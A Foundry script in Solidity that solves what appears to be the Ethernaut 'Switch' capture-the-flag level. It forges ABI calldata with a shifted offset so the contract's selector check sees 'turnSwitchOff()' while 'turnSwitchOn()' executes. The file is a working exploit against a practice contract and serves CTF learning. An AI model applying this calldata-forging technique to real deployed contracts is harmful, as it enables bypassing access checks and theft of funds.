pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Switch} from "../src/Level29.sol";

contract Level29Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));
        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address _target) private {
        bytes memory data = abi.encodePacked(
            bytes4(keccak256("flipSwitch(bytes)")),
            uint256(0x60),
            uint256(4),
            bytes32(bytes4(keccak256("turnSwitchOff()"))),
            uint256(4),
            bytes32(bytes4(keccak256("turnSwitchOn()")))
        );
        _target.call(data);
    }

    function levelDone(address _target, address _attacker) private returns (bool) {
        return Switch(_target).switchOn();
    }
}
